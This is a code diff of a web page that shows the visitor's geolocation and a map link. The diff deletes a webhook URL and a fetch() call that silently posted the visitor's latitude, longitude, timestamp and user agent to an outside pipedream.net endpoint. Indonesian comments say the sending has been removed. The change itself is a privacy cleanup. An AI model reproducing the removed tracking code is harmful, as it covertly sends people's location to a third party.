@@ -70,9 +70,6 @@ const output = document.getElementById('output');
 const locationLink = document.getElementById('locationLink');
 const mapLink = document.getElementById('mapLink');
 
-// Masukkan webhook kamu di bawah sini
-const webhookUrl = 'https://eojwlluosuqtl4j.m.pipedream.net';
-
 function getLocation() {
   if (!navigator.geolocation) return;
 
@@ -90,19 +87,8 @@ function getLocation() {
       mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
       locationLink.style.display = 'block';
 
-      // kirim ke webhook
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          latitude: lat,
-          longitude: lon,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent
-        })
-      })
-      .then(resp => console.log('Sent to webhook:', resp.status))
-      .catch(err => console.error('Webhook error', err));
+      // Hapus bagian kirim ke webhook karena sudah dihapus
+      // Fungsi ini sekarang hanya menampilkan data tanpa mengirimkan ke server manapun
     },
     err => {
       output.textContent = 'Permission denied or error.';
@@ -129,4 +115,3 @@ window.addEventListener('pageshow', () => {
 
 </body>
 </html>
-
